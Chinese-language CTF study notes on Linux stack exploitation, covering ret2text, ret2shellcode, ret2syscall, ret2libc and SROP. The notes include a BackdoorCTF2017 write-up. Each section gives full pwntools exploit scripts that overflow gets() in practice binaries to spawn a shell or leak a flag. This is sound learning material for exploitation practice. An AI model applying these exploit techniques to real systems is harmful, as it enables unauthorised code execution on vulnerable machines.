# level 1
## ret2text
- 第1步：用checksec查看文件
	- ![[Pasted image 20230416103610.png]]
- 第 2 步：使用IDA查看文件，发现main() 函数里有 gets 调用，存在溢出漏洞可利用
	- ![[Pasted image 20230416103702.png]]
- 第 3 步：字符串查找发现secure() 函数里调用了 system('/bin/sh') 函数 ，代码段可利用！
	- ![[Pasted image 20230416103741.png]]
	- ![[Pasted image 20230416103816.png]]
- 第4步：考虑如何利用get()进行栈溢出
	- 查看函数system('/bin/sh') 地址为：0X0804863A
		- ![[Pasted image 20230416105910.png]]
	- 计算栈帧中返回地址的偏移量
		- ![[Pasted image 20230417084418.png]]
		- 从上图可以发现此时的ebp和eax的值分别为0xffffd0e4和0xffffcfbc，相减得到变量s首地址到栈底的距离为0x6c，根据栈结构再加上ebp的4个字节。最后得到变量s首地址到返回地址的距离是0x70
	- 由此我们便可以构建payload为`'A' * 0x70 + addr_system
- 第5步：编写exp
	```python
	from pwn import *
	
	addr_system = 0x0804863A
	payload = b'A' * 0x70 + p32(addr_system)
	
	p = process('./ret2text')
	p.sendline(payload)
	p.interactive()
	
	```  
- 结果：
	- ![[Pasted image 20230417085339.png]]
## ret2shellcode
- 第1步：checksec查看文件
	- ![[Pasted image 20230417092856.png]]
- 第2步：查看反编译代码，发现危险函数gets，存在栈溢出漏洞
	- ![[Pasted image 20230417093030.png]]
- 第3步：考虑如何进行栈溢出
	- 计算返回地址偏移
	- 写入恶意代码，并将栈帧返回地址覆盖为字符串首地址，使得程序执行恶意代码。
- 第4步：编写exp
```python
from pwn import *

addr_buff = 0x804a080
shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * (0x70 - len(shellcode)) + p32(addr_buff)
print(payload)
p = process('./ret2shellcode')
p.sendline(payload)
p.interactive()

```
- 问题：
	- 在实际运行的时候发现并不能成功，使用gdb调试发现变量s对应的内存区域是不能执行的。![[Pasted image 20230417101029.png]]
	- 貌似是Linux5的特性，本人的Ubuntu版本是22.x
	- [c - Why ret2shellcode fail in ubuntu 22.04 but success in ubuntu 18.04.5 - Stack Overflow](https://stackoverflow.com/questions/73103985/why-ret2shellcode-fail-in-ubuntu-22-04-but-success-in-ubuntu-18-04-5)
	- 需要使用mprotect()来开启内存可执行。
- 
## ret2syscall
- 第1步：查看文件
	- ![[Pasted image 20230417121435.png]]
	- 发现内存不可执行
- 第2步：查看反编译代码和可利用字符串
	- 发现存在gets漏洞函数![[Pasted image 20230417121623.png]]
	- 还有字符串'/bin/sh'![[Pasted image 20230417121655.png]]
- 第3步：没有找到可以利用的函数，所以尝试利用系统调用。
	- 查找int中断![[Pasted image 20230417122203.png]]
	- 查找可以利用的gadget
		- ![[Pasted image 20230417122420.png]]
- 第4步：构思payload
	- 偏移量的计算和上面是相同的
	- 这里的payload像链条一样，覆盖原本栈帧的返回地址使得程序跳转到第一个gadget，将栈顶数据弹到eax寄存器，然后又是覆盖返回地址跳转到下一个gadget，将栈顶数据弹到对应的寄存器，重复操作直到我们要利用的系统调用的参数都已经在寄存器中准备好了。最后跳转到系统调用。
- 第5步：编写exp
```python
from pwn import *

sh = process('./ret2syscall')

binsh_addr = 0x80be408
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421

payload = b'a' * 112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(binsh_addr) + p32(int_0x80)
sh.sendline(payload)

sh.interactive()

```
- 结果
	- ![[Pasted image 20230417123604.png]]
## ret2libc1
- 第1步：查看文件
	- ![[Pasted image 20230417102954.png]]
	- 发现内存不可执行
- 第2步：查看反编译代码（和上面相同，不再展示），发现存在危险函数gets。
	- 查字符串发现可以利用的字符串‘/bin/sh’
	- ![[Pasted image 20230417104126.png]]
	- 同时也发现了system函数
	- ![[Pasted image 20230417105052.png]]
- 第3步：那么我们可以构造栈帧向system传输参数'/bin/sh'
	- 其参数是栈上 地址为 [esp] + 4 位置的内容
- 第4步：编写exp
```python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460

payload = b'a' * 112 + p32(system_plt) + b'b' * 4 + p32(binsh_addr)
sh.sendline(payload)

sh.interactive()
```
- 结果
	- ![[Pasted image 20230417123731.png]]
## ret2libc2
- 第1步：查看文件
	- ![[Pasted image 20230417123941.png]]
	- 同样内存不可执行
- 第2步：查看反汇编代码，发现gets危险函数，也有system函数，但是没有'/binsh'字符串
- 第3步：考虑如何利用漏洞
	- 主要是缺少字符串'/binsh'字符串，那么我们可以调用gets函数手动输入
	- 占位符+gets地址+system地址+gets参数（写入字符串的位置）+system参数（（写入字符串的位置）
- 第4步：编写exp
```python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
buf2 = 0x804a080
binsh = b'/bin/sh'

#payload = binsh + b'a' * (0x70 - len(binsh)) + p32(system_plt) + b'1234' + p32(buf2)
payload = b'a' * (0x70) + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```
- 结果
	- ![[Pasted image 20230417134145.png]]
# level 2
## SROP
srop的全称是Sigreturn Oriented Programming。所以我们首先需要了解一下Linux的信号机制
### signal 机制
![[Pasted image 20230424111157.png]]

如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
-   一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。
-   一个新的返回地址被添加到栈顶，这个返回地址指向 `sigreturn` 系统调用。
-   signal handler 被调用，signal handler 的行为取决于收到什么 signal。
-   signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 `sigreturn` 系统调用。
-   `sigreturn` 利用 signal frame 恢复所有寄存器以回到之前的状态。
-   最后，程序执行继续。
64位的signal frame如下图所示，signal frame由ucontext_t结构体实现。
```c
// defined in /usr/include/sys/ucontext.h
/* Userlevel context.  */
typedef struct ucontext_t
  {
    unsigned long int uc_flags;
    struct ucontext_t *uc_link;
    stack_t uc_stack;           // the stack used by this context
    mcontext_t uc_mcontext;     // the saved context
    sigset_t uc_sigmask;
    struct _libc_fpstate __fpregs_mem;
  } ucontext_t;

// defined in /usr/include/bits/types/stack_t.h
/* Structure describing a signal stack.  */
typedef struct
  {
    void *ss_sp;
    size_t ss_size;
    int ss_flags;
  } stack_t;

// difined in /usr/include/bits/sigcontext.h
struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short __pad0;
  __uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  __extension__ union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};
```
在栈中的分布如下
![[Pasted image 20230424135655.png]]
### SROP利用原理
在执行 `sigreturn` 系统调用的时候，不会对 signal 做检查，它不知道当前的这个 frame 是不是之前保存的那个 frame。由于 `sigreturn` 会从用户栈上恢复恢复所有寄存器的值，而用户栈是保存在用户进程的地址空间中的，是用户进程可读写的。如果攻击者可以控制了栈，也就控制了所有寄存器的值，而这一切只需要一个 gadget：`syscall; ret;`。
通过设置 `eax/rax` 寄存器，可以利用 `syscall` 指令执行任意的系统调用，然后我们可以将 `sigreturn` 和 其他的系统调用串起来，形成一个链，从而达到任意代码执行的目的。下面是一个伪造 frame 的例子：
![[Pasted image 20230424135918.png]]
`rax=59` 是 `execve` 的系统调用号，参数 `rdi` 设置为字符串“/bin/sh”的地址，`rip` 指向系统调用 `syscall`，最后，将 `rt_sigreturn` 设置为 `sigreturn` 系统调用的地址。当 `sigreturn` 返回后，就会从这个伪造的 frame 中恢复寄存器，从而拿到 shell。
对于这个寄存器的选择，因为系统调用号必须存入rax中，其他的寄存器选择就需要按照Linux下的函数调用约定来进行。
## pwnlib.rop.srop
在 pwntools 中已经集成了 SROP 的利用工具，即 [pwnlib.rop.srop](http://docs.pwntools.com/en/stable/rop/srop.html)，直接使用类 `SigreturnFrame`，我们可以看到针对不同的架构`SigreturnFrame`构造了不同的uncontext_t
![[Pasted image 20230424143739.png]]
## BackdoorCTF2017 Fun Signals
查看文件，可以看到这是一个64位的程序，并且没有开任何防护措施
![[Pasted image 20230424144150.png]]
拖入IDA中查看，可以看到程序中进行了两次syscall，第一次rax的值是0，调用read函数，第二次rax值是15，执行停止程序。同时我们也可以看到flag的位置，那么我们需要利用SROP将该位置的flag输出。
![[Pasted image 20230424145615.png]]
### 如何利用
再看这两个syscall：
- 第一个syscall是read函数，此时的edi是0，edx是0x400，rsi是栈顶的值，根据read函数的参数和Linux函数调用约定可以知道，这意思是从标准输入读取0x400个字节到栈顶。
- 第二个syscall是sigreturn，它会将栈中的数据按照ucontext_t结构恢复寄存器。
所以我们可以写入一个伪造的sigreturn frame，让sigreturn恢复。
为了能够输出flag，那我们伪造的sigreturn frame得是一个write函数的系统调用，系统调用号是0x1
```python
from pwn import *

elf = ELF('./funsignals_player_bin')
io = process('./funsignals_player_bin')
# io = remote('hack.bckdr.in', 9034)

context.clear()
context.arch = "amd64"

# Creating a custom frame
frame = SigreturnFrame()
frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = elf.symbols['flag']
frame.rdx = 50
frame.rip = elf.symbols['syscall']

io.send(str(frame))
io.interactive()
```
成功将flag输出。
![[Pasted image 20230424152823.png]]